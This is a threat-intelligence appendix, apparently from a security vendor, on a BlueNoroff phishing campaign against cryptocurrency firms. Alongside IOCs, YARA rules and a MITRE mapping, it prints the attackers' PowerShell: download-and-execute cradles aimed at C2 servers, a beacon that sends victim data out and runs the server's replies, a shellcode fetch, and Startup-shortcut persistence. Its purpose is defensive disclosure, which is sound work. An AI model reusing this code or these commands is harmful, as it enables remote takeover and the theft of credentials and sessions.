## APPENDIX 1: Referential Indicators of Compromise (IOCs)

## Network Indicators

_NOTE: This report contains sensitive technical indicators intended for defensive use. Do not use these indicators or techniques for offensive purposes._

**IOC** | **Type** | **Description** |
--- | --- | --- |
uu03webzoom[.]us | Domain | Phishing + payload delivery; typosquat of zoom[.]us |
uu03webzoom[.]us/j/8969791763?pwd=CIPWZTUQimQLKNXytEUQpwCscOBCPf.1 | URL | Full Zoom typosquat phishing link |
83[.]136[.]208[.]246:6783 | IP:Port | Primary C2 (PowerShell backdoor beacon, Telegram session exfil, screenshots) |
83[.]136[.]209[.]22:8444 | IP:Port | Secondary C2 (AES payload delivery, browser injector exfil) |
104[.]145[.]210[.]107:8444 | IP:Port | Tertiary C2 (browser file exfil, software inventory exfil) |
check02id[.]com:7365 | Domain:Port | Screenshot method #1 exfil endpoint |
thriddata[.]com | Domain | Camera exfiltration endpoint (Teams HTTP POST variants) |
/api/daemon | URI Path | C2 beacon endpoint |
/api/result | URI Path | C2 task result exfil endpoint |
/developer/sdk/update/version/896979176 | URI Path | Stage 1 payload URL |
/developer/sdk/fix/2/version/Ivo55HpFm | URI Path | Stage 2 (chromechip.log) URL |
hxxps://83[.]136[.]209[.]22:8444/download?id=8766ceb975cadedca38aad72091017cdb5d3e4c8f8af0441 | URL | Browser stealer shellcode download |
hxxps://83[.]136[.]209[.]22:8444/download?id=b1a87ab536188b10f02b3d84d03c0a45ed38f948a338d8f4 | URL | comBypassUacDLL.x64.dll download |
Telegram Bot Token: 8446140951:AAExeAepUZQAegP0A9IQbp__JB4xDaq4ohc | API Token | Screenshot exfil via Telegram Bot API |
Telegram Chat ID: 7016628218 | Chat ID | Screenshot exfil destination |

## File Hashes

**Recovered PowerShell Samples (from Script Block Logging / EDR telemetry):**

**SHA-256** | **Filename** | **Description** |
--- | --- | --- |
ee4807a19e432cf370f860f7b4deb84b04349143f921ac62fb0f6ef9eb3e6123 | stage1_encoded_blob.b64 | Stage 2 encoded payload blob (Base64 + XOR 0x43) |
0fdac2d4f5fe127eec1754ceebfb67131a03e0271d5e128db2084665cac88533 | xor_decoder_PID28692.ps1 | XOR 0x43 decoder routine used across all stages |
29fb6b49e33d8b6dc967a0b11d1225ec5a9f30faf6bde341bf3545298656fe6b | stage1_downloader_PID28692.ps1 | Stage 2 downloader (downloads chromechip.log, shows lure dialog) |
2acf6335315f7ba1270d7cfaaa7e420794ce0f7c8f5c1ba41be5075ced19e537 | stage2_PowerShell_Backdoor_Implant_decoded_PID1696.ps1 | Stage 3 C2 implant (beacon‑task‑result architecture, 5s polling) |
bc94f02c97af6761f9dc21d39ea4564a209f087c3441a33872e68742f468a9c5 | c2_beacon_POST_request_PID19896_(Victim_Info).ps1 | Captured C2 beacon POST with full victim system profile JSON |
841444082ae59707aeb47b597282e17d5d9af37c00f146745d88baac308dc8e3 | installed_apps_enum_PID19896.ps1 | Installed software enumeration via registry Uninstall keys |
4aa85fabfe717b3c31e0b24afb4a07008305e0a9faedf295d4e74a49e0ec3b40 | browser_theft_PID1696.ps1 | Browser file theft (Chrome/Edge/Brave/Opera Local State + Login Data + Cookies + Extensions) |
8a7273889c3fedf81ffe2dcfc1a321771620d71cd0d98125a0a237842d79f35e | aes_injector_PID1696.ps1 | AES‑encrypted shellcode injector (obfuscated original) |
96ab701c444d9922802fe20adfc81f3476e014f8c4ba0b951714127ecac58edf | aes_injector_full_decoded_PID1696.ps1 | AES‑encrypted shellcode injector (fully deobfuscated – PBKDF2 decrypt + C# compile + browser injection + exfil) |
d498013b6f27debf027352a5c8b481ade180541443c027afdc1c3634ca7f2a1f | csharp_pinvoke_class_pgfbrpca.cs | Extracted C# P/Invoke class (pgfbrpca) with delegate‑to‑Win32 API mapping |
f391954378707e8b471c785ee792efacf97e7be80d4200966cbb176d531f0721 | persistence_lnk_PID1696.ps1 | Persistence LNK creator (chrome‑debug‑data001.log + Startup shortcut) |
345b3497d5c7945c9c2e47663926f0dcdd931be3df12c4f7d10d6356a3b5bc7c | persistence_full_decoded_PID1696.ps1 | Persistence mechanism (fully decoded) |
a37cb38b178833f15bf13fd5fa622b694c2244230ac0be33e75680c71dc08a08 | screenshot_capture_PID1696.ps1 | Screenshot capture (Win32 API full‑desktop JPEG + JSON POST to check02id[.]com) |

## Binary Payloads (AES‑Decrypted Shellcode and Compiled Artifacts)

**SHA-256** | **Description** |
--- | --- |
17158cd6490a2b3c672d087f3d69107643d6a6f7c67345461b10ae18f27e28d1 | Stage A: Position‑independent shellcode implant (COM‑style vtable, HTTP C2, LZ decompression, zero imports) |
db446f0e1d18b43805bfefe1af934ae4b0879e376904635cc7e14eae2d7fc682 | Stage B: Chromium browser credential stealer PE (MSVC VS2022, AES‑256‑GCM via BCrypt, COM IElevator app‑bound key bypass, embedded SQLite) |
dd1c72823f933952619cbb86aaeaea43057a259e9a0c9e3b11c82225ec3faaa1 | comBypassUacDLL.x64.dll – UAC bypass DLL (reflective loader, COM elevation moniker) |
E598EB0078A3C6D887135518EDA1424E59F2B6CBF5A902FFE1063C34E03E3ED8 | 0bwp14cn.dll – Runtime‑compiled C# injector class (pgfbrpca) |
EDD0301FFB793169B1314C59C0EF3A98D5793C0441DD43A7C484D61DEB4F107F | pfx4cshy.dll – Runtime‑compiled C# injector class (kernel32) |
6030338469819129924C6E01E110145A128CA3D944CD4B696ABC7925A1840001 | khjx0fvf.dll – Runtime‑compiled C# screenshot capture class |

## System Artifacts

**Artifact** | **Type** | **Description** |
--- | --- | --- |
%TEMP%\chromechip.log | Implant Payload | Stage 3 C2 implant; re‑downloaded every boot; executed via `Get-Content \| iex` |
%USERPROFILE%\chrome-debug-data001.log | Persistence Payload | Base64 + XOR 0x43 bootstrap; decoded on boot to re‑execute implant |
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Chrome Update - Certificated.lnk | Startup LNK | Chrome icon disguise, `WindowStyle=7`; target: `cmd.exe /c powershell -ep Bypass -c "gc chrome-debug-data001.log \| iex"` |
C:\Users\Public\log.ini | Shellcode Output | Master extraction log across all injected browsers; structured `[*]` and `[+]` prefixed entries (for example, `[*] DecryptionOrchestrator void Run()`, `[+] Decrypted AES Key:`) |
C:\Users\Public\pchr.csv | Shellcode Output | Chrome in‑process decrypted credentials (origin_url, username_value, password_value) |
C:\Users\Public\pmse.csv | Shellcode Output | Edge in‑process decrypted credentials |
C:\Users\Public\pbra.csv | Shellcode Output | Brave in‑process decrypted credentials |
fingerprint.json (per browser) | Shellcode Output | Browser/system reconnaissance: version, paths, search engine, extensions (crypto wallets), autofill settings, computer_name, username |
C:\Users\Public\Chrome\ | Shellcode Output | Chrome additional extracted data directory |
C:\Users\Public\Edge\ | Shellcode Output | Edge additional extracted data directory |
C:\Users\Public\Brave\ | Shellcode Output | Brave additional extracted data directory |
%TEMP%\tel_<username>.zip | Exfil Archive | Telegram session data |
%TEMP%\ext_<username>.zip | Exfil Archive | Browser vaults (5 browsers, all profiles) |
%TEMP%\cps_<username>.zip | Exfil Archive | Shellcode output: log.ini + CSV files + browser dirs |
%TEMP%\lg_<username> | Exfil File | Installed software inventory CSV |
%TEMP%\0bwp14cn.dll | Compiled DLL | pgfbrpca injector class (csc.exe output) |
%TEMP%\pfx4cshy.dll | Compiled DLL | kernel32 injector class (csc.exe output) |
%TEMP%\khjx0fvf.dll | Compiled DLL | Screenshot capture class (csc.exe output) |

## HTML Delivery Commands

**Lure Type** | **Delivery Command Pattern** |
--- | --- |
Zoom (IWR) | `powershell -ep bypass -c "(iwr -Uri <C2> -UserAgent 'ZoomSDK' -UseBasicParsing).Content \| iex"` |
Zoom (curl) | `curl -A ZoomSDK -s <C2> \| powershell.exe -c "[Console]::In.ReadToEnd() \| iex"` |
Teams WSS | `curl -L -k <C2> \| powershell -c "[Console]::In.ReadToEnd()\|iex"` |
Teams HTTP POST | `powershell -ep bypass -c "(iwr -Uri <C2> -UserAgent 'teamsdk' -UseBasicParsing).Content \| iex"` |

## C2 Beacon – JSON Payload Reconstruction

```powershell
$RFj7HqR5F8kC = @{
    mid         = $6e0vveAvBqgQ           # Server-assigned GUID
    did         = $FYY7ZU5XlNTq           # Timestamp: yyyyMMddHHmmss
    user        = $GyvPWBnKPmzc + '|' + $tMvUBENKnieC  # COMPUTERNAME|USERNAME
    osversion   = $dBbvXPS1JNst           # for example "10.0.26200"
    timezone    = $H4Z1WkL8e2zU           # for example "(UTC-05:00) Eastern Time"
    installdate = $sLe5nhqwKfVH           # OS install date
    proclist    = $FXceoVPja9cI           # Full process list + IsVM + IsAdmin
    isAdmin     = $G7qQ0ChSlNBz           # "Admin" or "User"
} | ConvertTo-Json

# POST to C2 and execute any returned PowerShell
$4PrDpvndZnEg = $tiVYf9m5IHMe + '/api/daemon'
$YcFRuTzRccAN = Invoke-RestMethod -Uri $4PrDpvndZnEg -Method Post -Body $RFj7HqR5F8kC `
    -ContentType 'application/json'
if($YcFRuTzRccAN) {
    $LtAM2WSnwGfi = iex $YcFRuTzRccAN    # Execute C2 response via IEX
    $Avttfw2CWHRS = $LtAM2WSnwGfi | Out-String
    # Return results to C2
    $lhat9DirRT4c = @{ did=$FYY7ZU5XlNTq; status='ok'; result=$Avttfw2CWHRS } | ConvertTo-Json
    Invoke-RestMethod -Uri ($tiVYf9m5IHMe + '/api/result') -Method Post -Body $lhat9DirRT4c
}
```

## AES‑256‑CBC Payload Decryption

```powershell
$02zavfGCFGzV = "curl.exe -X POST -k -H 'Auth: ufjqsmjsaydc9ub6t1e0psn8183lvu2z' " +
    "hxxps://83[.]136[.]209[.]22:8444/download?id=8766ceb975cadedca38aad72091017cdb5d3e4c8f8af0441"
$8IbYH63YTZ7L = powershell -WindowStyle Hidden -Command $02zavfGCFGzV
$v5ILId5fcCnF = [Convert]::FromBase64String($8IbYH63YTZ7L)
$idSnpPoUcJEC = $v5ILId5fcCnF[0..15]                         # IV: first 16 bytes
$bfNbQHwy3P24 = $v5ILId5fcCnF[16..($v5ILId5fcCnF.Length-1)]  # Ciphertext: remainder

$WCz3mpFYJNnx = ([System.Security.Cryptography.Rfc2898DeriveBytes]::new(
    '[REDACTED]',                                           # Password
    [Text.Encoding]::ASCII.GetBytes('SALTED__'),           # Salt
    100000, 'SHA256')).GetBytes(32)                        # 100K iterations -> 256-bit key

$TX6yT62P4jMH = [System.Security.Cryptography.AesManaged]::new()
$TX6yT62P4jMH.Key     = $WCz3mpFYJNnx
$TX6yT62P4jMH.IV      = $idSnpPoUcJEC
$TX6yT62P4jMH.Mode    = 'CBC'
$TX6yT62P4jMH.Padding = 'PKCS7'

$OF0F7UFS8WOQ = $TX6yT62P4jMH.CreateDecryptor().TransformFinalBlock(
    $bfNbQHwy3P24, 0, $bfNbQHwy3P24.Length)                # Decrypted shellcode
```

## Delegate to API Mapping

```csharp
// C# P/Invoke loader class - compiled at runtime via Add-Type
// Delegate names are randomized; mapped Win32 APIs shown in comments
public static class pgfbrpca {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool FreeLibrary(IntPtr hModule);
}

// dyqbvsia9r7b3rxv -> OpenProcess
// fnkjjf5rvqistcz2 -> VirtualAllocEx
// t64crctfo7izgkqs -> WriteProcessMemory
// hy9582l5iz6i69yf -> CreateRemoteThread
// lry3yvcp4mfwzab3 -> CloseHandle
// l54ajio2h5v451ss -> WaitForSingleObject
```

## Persistence – LNK File Creation in Startup Folder

```powershell
# Persistence - LNK file creation in Startup folder
$WshShell = New-Object -ComObject WScript.Shell
$sta = Join-Path $env:USERPROFILE "chrome-debug-data001.log"

# Write the XOR-encoded bootstrap to the log file
$cmd = @"
@("IyN3JjEmN05JZwY3...TkkQ...")|ForEach-Object{
  [Text.Encoding]::UTF8.GetString([byte[]]([Convert]::FromBase64String($_)|
  ForEach-Object{[byte]($_ -bxor 0x43)}))}|iex *> $null
"@ | Set-Content -Path $sta

# Create the disguised Startup shortcut
$ShortcutPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\" +
    "Start Menu\Programs\Startup\Chrome Update - Certificated.lnk"
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath  = "cmd.exe"
$Shortcut.Arguments   = '/c powershell -ep Bypass -c "Get-Content ''$($sta)'' | iex"'
$Shortcut.WorkingDirectory = "C:\Program Files\Google\Chrome\Application"
$Shortcut.WindowStyle = 7        # Minimized - no visible window on boot
$Shortcut.IconLocation = "C:\Program Files\Google\Chrome\Application\chrome.exe,0"
$Shortcut.Save()
```

## Telemetry for Observed Execution Chain

| Timestamp (UTC) | PID | Parent | Process | Detail |
|---|---|---|---|---|
| 17:04:55 | 34448 | explorer.exe | WindowsTerminal.exe | Terminal opened by victim |
| 17:04:56 | 28028 | WindowsTerminal | powershell.exe | Default shell |
| 17:05:10 | 28028 |  | powershell.exe | Script block: cmd |
| 17:05:10 | 37800 | powershell.exe | cmd.exe | Decoy command execution |
| 17:05:10 | 24492 | cmd.exe | setx.exe | setx audio_volume 100 |
| 17:05:10 | 5916 | cmd.exe | pnputil.exe | Audio device enumeration |
| 17:05:10 | 44596 | cmd.exe | msedge.exe | Opens legitimate Zoom SDK docs |
| 17:05:10 | 28692 | cmd.exe | powershell.exe | Injected payload executes |
| 17:05:14 | 1696 | powershell.exe | powershell.exe | Executes chromechip.log via Get-Content | iex |



## Tasking Timeline (Day 1: January 23, 2026):
| Timestamp (UTC) | Action |
|---|---|
| 17:05:39 | C2 implant (chromechip.log) begins execution |
| 17:05:56 | Telegram Desktop session stealer deployed |
| 17:06:03 | Installed software discovery script deployed |
| 17:06:27 | Browser file theft script deployed |
| 17:07:02 | AES-encrypted browser injector shellcode downloaded and injected |
| 17:07:31 | Persistence LNK file created |
| 17:07:48 | Screenshot capture and exfiltration |


## Day 1: Exfiltration Summary

The following table summarizes the data exfiltrated on the first day of compromise (January 23, 2026). The entire exfiltration sequence, from initial C2 beacon to screenshot capture, completed within approximately two minutes.

| Time (UTC) | PID   | Destination                | Data Exfiltrated                                                                              |
| ---------- | ----- | -------------------------- | --------------------------------------------------------------------------------------------- |
| 17:05:56   | 1696  | 83[.]136[.]208[.]246:6783  | Telegram session (tdata/key_datas)                                                            |
| 17:06:03   | 19896 | 104[.]145[.]210[.]107:8444 | Installed software inventory (CSV)                                                            |
| 17:06:20   | 1696  | 104[.]145[.]210[.]107:8444 | Browser data - encrypted vaults from all 5 browsers                                           |
| 17:06:55   | 1696  | 83[.]136[.]209[.]22:8444   | AES Payload 1 download (browser injector shellcode)                                           |
| 17:07:02   | 1696  | 83[.]136[.]209[.]22:8444   | Post-injection: cps_NAME-REDACTED].zip (log.ini, pchr.csv, pmse.csv, pbra.csv + browser dirs) |
| Ongoing    | 1696  | 83[.]136[.]208[.]246:6783  | Screenshots + C2 beacon results                                                               |


## Operator Profile Indicators (From Media Forensics)

| Indicator                       | Type             | Description                                                                                           |
| ------------------------------- | ---------------- | ----------------------------------------------------------------------------------------------------- |
| /Users/king/                    | macOS Username   | Operator home directory referenced in all Premiere Pro project paths                                  |
| MacBookPro18,1                  | Hardware         | Apple MacBook Pro model identified in screen recording metadata                                       |
| macOS 15.5                      | Operating System | Host OS version                                                                                       |
| target.prproj                   | Premiere Project | Primary video editing project (73 video references) at /Users/king/Documents/Adobe/Premiere Pro/15.0/ |
| test.prproj                     | Premiere Project | Secondary video editing project (6 video references)                                                  |
| Adobe Premiere Pro 2021 (v15.0) | Software         | Video editing and composition tool                                                                    |
| VMware (Windows 10 guest)       | Virtualization   | Windows VM used for screen-recording video calls                                                      |
| ChatGPT / GPT-4o                | AI Tool          | Used to generate 8 synthetic portrait images (C2PA provenance confirmed)                              |


## APPENDIX 2: Applied Countermeasures

### YARA Rules

```yara
rule BlueNoroff_Fake_Zoom_or_MsMeetings_files {
    meta:
        description = "Rule to detect fake Zoom or MsTeams meeting HTML lure files"
        author = "Arctic Wolf"
        distribution = "TLP:CLEAR"
        version = "1.0"
        creation_date = "2026-03-23"
        last_modified = "2026-03-23"
        hash256 = "41f88d7629884af27fe1a0aea7df3d2dcc3ed88e5b355eb2b82fa79d03f828fe"
        hash256 = "2122b0b9452c2c7125ad468ee8956c9f2fd19604d4c68999a33e2e1d06ca8980"
    strings:
        $zoom1 = "<!doctype html>" ascii wide
        $zoom2 = "zoomCodeCopied" ascii wide
        $zoom3 = "Troubleshooting SDK issues" ascii wide
        $zoom4 = "Zoom Meeting is not working properly" ascii wide
        $teams1 = "<!doctype html>" ascii wide
        $teams2 = "prejoin-audio-common-header-no-audio" ascii wide
        $teams3 = "Join muted to avoid causing audio distruption." ascii wide
        $teams4 = "TeamsFx SDK has been officially deprecated by" ascii wide
    condition:
        filesize < 900KB and
        (all of ($zoom*) or all of ($teams*))
}

rule BlueNoroff_BypassUacDLL {
    meta:
        description = "Rule to detect UAC Bypass DLL used by BlueNoroff"
        author = "Arctic Wolf"
        distribution = "TLP:CLEAR"
        version = "1.0"
        creation_date = "2026-03-19"
        last_modified = "2026-03-19"
        hash256 = "dd1c72823f933952619cbb86aaeaea43057a259e9a0c9e3b11c82225ec3faaa1"
    strings:
        $a1 = "comBypassUacDLL.x64.dll" ascii wide
        $a2 = "C:\\Windows\\System32\\cmd.exe" ascii wide
        $a3 = "ReflectiveLoader@@YA_KPEAX@Z" ascii wide
        $a4 = "Elevation:Administrator!new:%s" ascii wide
    condition:
        uint16(0) == 0x5a4d and ((filesize < 500KB) and all of ($a*))
}


rule BlueNoroff_Browser_implant {
    meta:
        description = "Rule to detect NK Browser implant"
        author = "Arctic Wolf"
        distribution = "TLP:AMBER"
        version = "1.0"
        creation_date = "2026-03-24"
        last_modified = "2026-03-24"
        hash256 = "db446f0e1d18b43805bfefe1af934ae4b0879e376904635cc7e14eae2d7fc682"
    strings:
        $a1 = "chrome" ascii wide
        $a2 = "brave" ascii wide
        $a3 = "msedge" ascii wide
        $a4 = "[*] Extraction complete:" ascii wide
        $a5 = "[*] Extracting browser fingerprint data..." ascii wide
        $a6 = "GetConfigForCurrentProcess" ascii wide
        $a7 = "C:\\Users\\Public\\log.ini" ascii wide
        $a8 = "[+] Decrypted AES Key" ascii wide
    condition:
        uint16(0) == 0x5a4d and ((filesize < 5000KB) and all of ($a*))
}
```

## APPENDIX 3: Weaponization and Technical Overview

| Category               | Detail                                                                                                                                                                                                                                                                                                          |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Weapons                | Obfuscated PowerShell scripts (Base64 + XOR 0x43), AES-256-CBC encrypted shellcode, inline-compiled C# injectors, reflective DLL loader (comBypassUacDLL.x64.dll), Startup LNK persistence, AI-generated deepfake meeting participant content (ChatGPT/GPT-4o portraits + Adobe Premiere Pro video composition) |
| Attack Vector          | Spear-phishing via Calendly calendar invites containing typosquatted Zoom meeting links; ClickFix-style clipboard injection delivering PowerShell execution cradles                                                                                                                                             |
| Network Infrastructure | Attacker-operated C2 servers on Petrosky Cloud LLC (AS400897) infrastructure; typosquatted Zoom and Microsoft Teams domains; Telegram Bot API for screenshot exfiltration                                                                                                                                       |
| Targets                | North American Web3/Cryptocurrency companies; broader campaign targets Web3 executives, venture capitalists, and blockchain developers globally                                                                                                                                                                 |


## APPENDIX 4: Detailed MITRE ATT&CK® Mapping

| Tactic               | Technique                                              | Sub-Technique / Procedure Context                                                                                           |
| -------------------- | ------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------- |
| Reconnaissance       | T1593.001 - Search Open Websites/Domains: Social Media | Attacker researches targets via LinkedIn and Telegram to identify Web3 executives and tailor fake meeting participant lists |
| Resource Development | T1583.001 - Acquire Infrastructure: Domains            | Registration of 80+ typosquatted Zoom and Teams domains on AS400897                                                         |
| Resource Development | T1585.001 - Establish Accounts: Social Media Accounts  | Calendly page impersonating a fintech legal figure; Telegram accounts hijacked                                              |
| Resource Development | T1585.002 - Establish Accounts: Email Accounts         | Operator maintains storage account for hosting fake participant media                                                       |
| Resource Development | T1588.001 - Obtain Capabilities: Malware               | Custom PowerShell C2 implant, AES-encrypted browser injection shellcode, comBypassUacDLL reflective DLL                     |
| Resource Development | T1588.005 - Obtain Capabilities: Exploits              | AI-generated portraits used for deepfake pipeline                                                                           |
| Resource Development | T1587.001 - Develop Capabilities: Malware              | Deepfake production pipeline using VMware + Premiere Pro + FFmpeg                                                           |
| Initial Access       | T1566.002 - Phishing: Spearphishing Link               | Typosquatted Zoom URL via calendar invite                                                                                   |
| Execution            | T1204.001 - User Execution: Malicious Link             | Victim clicked link and executed clipboard payload                                                                          |
| Execution            | T1059.001 - PowerShell                                 | Multi-stage PowerShell chain                                                                                                |
| Execution            | T1059.003 - Windows Command Shell                      | cmd.exe used in execution chain                                                                                             |
| Execution            | T1059.009 - Cloud API                                  | Telegram Bot API for exfiltration                                                                                           |
| Persistence          | T1547.009 - Shortcut Modification                      | Startup LNK persistence                                                                                                     |
| Privilege Escalation | T1548.002 - Bypass UAC                                 | COM elevation via DLL                                                                                                       |
| Defense Evasion      | T1027.013 - Encrypted/Encoded File                     | Base64 + XOR + AES payloads                                                                                                 |
| Defense Evasion      | T1140 - Deobfuscation                                  | Runtime decoding                                                                                                            |
| Defense Evasion      | T1055.001 - Process Injection                          | Injection into browser processes                                                                                            |
| Defense Evasion      | T1620 - Reflective Code Loading                        | Reflective DLL loading                                                                                                      |
| Defense Evasion      | T1027.004 - Compile After Delivery                     | Runtime C# compilation                                                                                                      |
| Defense Evasion      | T1036.005 - Masquerading                               | Chrome-like filenames                                                                                                       |
| Credential Access    | T1555.003 - Credentials from Browsers                  | Credential theft + decryption                                                                                               |
| Credential Access    | T1539 - Steal Web Session Cookie                       | Cookie exfiltration                                                                                                         |
| Discovery            | T1518 - Software Discovery                             | Registry enumeration                                                                                                        |
| Discovery            | T1082 - System Information Discovery                   | Host profiling                                                                                                              |
| Discovery            | T1057 - Process Discovery                              | Process enumeration                                                                                                         |
| Discovery            | T1497.001 - VM Evasion                                 | VM detection techniques                                                                                                     |
| Discovery            | T1217 - Browser Info Discovery                         | Extension + config enumeration                                                                                              |
| Collection           | T1113 - Screen Capture                                 | Desktop screenshots                                                                                                         |
| Collection           | T1125 - Video Capture                                  | Camera capture via browser                                                                                                  |
| Collection           | T1005 - Data from Local System                         | Local file exfiltration                                                                                                     |
| Exfiltration         | T1041 - Exfiltration Over C2                           | HTTP POST                                                                                                                   |
| Exfiltration         | T1567 - Exfiltration Over Web Service                  | Telegram + WebSockets                                                                                                       |
| Exfiltration         | T1048.001 - Alternative Protocol                       | HTTPS exfiltration                                                                                                          |
| Command and Control  | T1071.001 - Web Protocols                              | HTTP C2 endpoints                                                                                                           |
| Command and Control  | T1105 - Ingress Tool Transfer                          | Payload download                                                                                                            |
| Command and Control  | T1573.001 - Encrypted Channel                          | AES-256-CBC encryption                                                                                                      |
